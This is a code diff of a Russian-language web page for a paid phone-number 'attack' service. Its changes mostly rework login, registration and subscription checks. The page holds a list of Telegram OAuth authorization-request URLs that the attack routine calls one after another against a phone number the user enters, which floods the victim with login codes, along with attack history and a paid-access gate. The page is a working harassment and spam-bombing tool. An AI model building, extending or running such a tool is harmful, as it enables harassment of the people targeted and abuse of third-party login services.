@@ -121,7 +121,6 @@
         }
         .no-sub h2 { color: #ff4444; margin-bottom: 15px; }
         .no-sub p { color: #ff8888; margin-bottom: 20px; }
-        .no-sub a { color: #00ff00; }
         .stats {
             display: flex;
             gap: 10px;
@@ -146,11 +145,10 @@
             cursor: pointer;
             margin: 0 2px;
         }
+        .success-msg { color: #00ff00; text-align: center; margin-top: 10px; }
         @media (max-width: 500px) {
             .container { padding: 15px; }
             h1 { font-size: 22px; }
-            .stats { flex-wrap: wrap; }
-            .stat-card { min-width: 100px; }
         }
     </style>
 </head>
@@ -164,16 +162,17 @@
         <div id="loginForm">
             <input type="text" id="loginLogin" placeholder="Логин">
             <input type="password" id="loginPassword" placeholder="Пароль">
-            <button onclick="login()">ВОЙТИ</button>
+            <button onclick="doLogin()">ВОЙТИ</button>
             <p style="text-align:center; margin-top:10px;">Нет аккаунта? <a href="#" onclick="showRegister()">Регистрация</a></p>
         </div>
         <div id="registerForm" style="display:none">
             <input type="text" id="regLogin" placeholder="Логин">
             <input type="password" id="regPassword" placeholder="Пароль">
-            <button onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+            <button onclick="doRegister()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
             <p style="text-align:center; margin-top:10px;">Уже есть аккаунт? <a href="#" onclick="showLogin()">Войти</a></p>
         </div>
         <div id="authError" style="color:#ff4444; text-align:center; margin-top:10px;"></div>
+        <div id="authSuccess" style="color:#00ff00; text-align:center; margin-top:10px;"></div>
     </div>
 
     <!-- Нет подписки -->
@@ -182,7 +181,8 @@
             <h2>⛔ ДОСТУП ЗАКРЫТ</h2>
             <p>У вас нет активной подписки.</p>
             <p>Обратитесь к администратору:<br>Telegram: <strong>@Amnesia</strong></p>
-            <p style="font-size:12px;">После получения подписки перезагрузите страницу</p>
+            <p style="font-size:12px;">После получения подписки войдите заново</p>
+            <button onclick="logout()" style="background:#ff4444; color:#fff;">ВЫЙТИ</button>
         </div>
     </div>
 
@@ -221,7 +221,7 @@
                 <hr style="border-color:#00ff00; margin:10px 0;">
                 <p><strong>Админ:</strong> @Amnesia</p>
                 <p><strong>Версия:</strong> 3.0</p>
-                <p><strong>Подписка:</strong> Активна</p>
+                <p><strong>Статус:</strong> Подписка активна</p>
             </div>
         </div>
     </div>
@@ -232,7 +232,6 @@
     // ========== НАСТРОЙКИ ==========
     const API_BASE = 'https://use-production-88cf.up.railway.app';
     
-    // Список URL для атаки
     const ATTACK_URLS = [
         'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
         'https://translations.telegram.org/auth/request',
@@ -246,18 +245,20 @@
         'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
     ];
 
-    // Переменные
     let attackHistory = JSON.parse(localStorage.getItem('shadow_history')) || [];
     let currentToken = localStorage.getItem('token');
 
-    // ========== ФУНКЦИИ АВТОРИЗАЦИИ ==========
-    async function register() {
+    // ========== ФУНКЦИИ ==========
+    async function doRegister() {
         const login = document.getElementById('regLogin').value;
         const password = document.getElementById('regPassword').value;
         if (!login || !password) {
-            document.getElementById('authError').innerText = 'Заполните все поля';
+            showAuthError('Заполните все поля');
             return;
         }
+        showAuthError('');
+        showAuthSuccess('');
+        
         try {
             const res = await fetch(API_BASE + '/register', {
                 method: 'POST',
@@ -266,24 +267,26 @@
             });
             const data = await res.json();
             if (data.success) {
-                localStorage.setItem('token', data.token);
-                currentToken = data.token;
-                checkAuth();
+                showAuthSuccess('✅ Регистрация успешна! Теперь войдите в аккаунт.');
+                showLogin();
+                document.getElementById('loginLogin').value = login;
             } else {
-                document.getElementById('authError').innerText = data.error;
+                showAuthError(data.error);
             }
         } catch(e) {
-            document.getElementById('authError').innerText = 'Ошибка соединения';
+            showAuthError('Ошибка соединения с сервером');
         }
     }
 
-    async function login() {
+    async function doLogin() {
         const login = document.getElementById('loginLogin').value;
         const password = document.getElementById('loginPassword').value;
         if (!login || !password) {
-            document.getElementById('authError').innerText = 'Заполните все поля';
+            showAuthError('Заполните все поля');
             return;
         }
+        showAuthError('');
+        
         try {
             const res = await fetch(API_BASE + '/login', {
                 method: 'POST',
@@ -294,48 +297,57 @@
             if (data.success) {
                 localStorage.setItem('token', data.token);
                 currentToken = data.token;
-                checkAuth();
+                await checkSubscriptionAndAccess();
             } else {
-                document.getElementById('authError').innerText = data.error;
+                showAuthError(data.error);
             }
         } catch(e) {
-            document.getElementById('authError').innerText = 'Ошибка соединения';
+            showAuthError('Ошибка соединения с сервером');
         }
     }
 
-    async function checkAuth() {
+    async function checkSubscriptionAndAccess() {
         const token = localStorage.getItem('token');
         if (!token) {
             showAuth();
             return;
         }
+        
         try {
             // Проверяем токен
-            const res = await fetch(API_BASE + '/me', {
+            const meRes = await fetch(API_BASE + '/me', {
                 headers: { 'Authorization': 'Bearer ' + token }
             });
-            if (!res.ok) {
+            if (!meRes.ok) {
                 localStorage.removeItem('token');
                 showAuth();
                 return;
             }
+            
             // Проверяем подписку
             const subRes = await fetch(API_BASE + '/check_subscription', {
                 headers: { 'Authorization': 'Bearer ' + token }
             });
             const subData = await subRes.json();
+            
             if (subData.has_access) {
                 showApp();
                 updateHistoryDisplay();
-                document.getElementById('status').innerHTML = '✅ ГОТОВ';
+                document.getElementById('status').innerHTML = '✅ АКТИВЕН';
             } else {
                 showNoSubscription();
                 document.getElementById('status').innerHTML = '⛔ НЕТ ПОДПИСКИ';
             }
         } catch(e) {
             showAuth();
-            document.getElementById('status').innerHTML = '⚠️ ОШИБКА';
         }
+    }
+
+    function logout() {
+        localStorage.removeItem('token');
+        currentToken = null;
+        showAuth();
+        document.getElementById('status').innerHTML = '⏳ ЗАГРУЗКА';
     }
 
     function showAuth() {
@@ -344,6 +356,8 @@
         document.getElementById('mainContent').style.display = 'none';
         document.getElementById('loginForm').style.display = 'block';
         document.getElementById('registerForm').style.display = 'none';
+        document.getElementById('authError').innerText = '';
+        document.getElementById('authSuccess').innerText = '';
     }
 
     function showNoSubscription() {
@@ -356,19 +370,28 @@
         document.getElementById('authForms').style.display = 'none';
         document.getElementById('noSubscription').style.display = 'none';
         document.getElementById('mainContent').style.display = 'block';
-        document.getElementById('status').innerHTML = '✅ АКТИВЕН';
+    }
+
+    function showAuthError(msg) {
+        document.getElementById('authError').innerText = msg;
+    }
+    
+    function showAuthSuccess(msg) {
+        document.getElementById('authSuccess').innerText = msg;
     }
 
     function showRegister() {
         document.getElementById('loginForm').style.display = 'none';
         document.getElementById('registerForm').style.display = 'block';
         document.getElementById('authError').innerText = '';
+        document.getElementById('authSuccess').innerText = '';
     }
 
     function showLogin() {
         document.getElementById('registerForm').style.display = 'none';
         document.getElementById('loginForm').style.display = 'block';
         document.getElementById('authError').innerText = '';
+        document.getElementById('authSuccess').innerText = '';
     }
 
     // ========== АТАКА ==========
@@ -377,13 +400,19 @@
         const logsDiv = document.getElementById('logs');
         logsDiv.innerHTML = '';
         
+        // Проверка на пустой номер
+        if (!phone) {
+            addLog('❌ Введите номер телефона', true);
+            return;
+        }
+        
+        // Проверка формата
         const phoneRegex = /^(\+?[78]\d{10}$)|^(\+380\d{9}$)/;
         if (!phoneRegex.test(phone.replace(/\s+/g, ''))) {
             addLog('❌ Неверный формат номера. Пример: +79001234567', true);
             return;
         }
 
-        // Проверка белого списка
         addLog('🔍 Проверка номера в белом списке...');
         try {
             const wRes = await fetch(API_BASE + '/is_whitelisted', {
@@ -394,8 +423,6 @@
             const wData = await wRes.json();
             if (wData.blocked) {
                 addLog('⛔ Номер в белом списке. Атака заблокирована.', true);
-                document.getElementById('status').innerHTML = '⛔ ЗАБЛОКИРОВАНО';
-                setTimeout(() => document.getElementById('status').innerHTML = '✅ ГОТОВ', 2000);
                 return;
             }
         } catch(e) {
@@ -422,7 +449,6 @@
             await new Promise(r => setTimeout(r, 100));
         }
         
-        // Сохраняем в историю
         attackHistory.unshift({
             id: Date.now(),
             timestamp: new Date().toISOString(),
@@ -436,8 +462,6 @@
         addLog(`🎯 АТАКА ЗАВЕРШЕНА! Успешно: ${success}/${ATTACK_URLS.length}`);
         document.getElementById('status').innerHTML = '✅ ГОТОВ';
         updateHistoryDisplay();
-        
-        // Очищаем поле
         document.getElementById('phone').value = '';
     }
 
@@ -507,7 +531,7 @@
     }
 
     // ========== ЗАПУСК ==========
-    checkAuth();
+    checkSubscriptionAndAccess();
 </script>
 </body>
 </html>
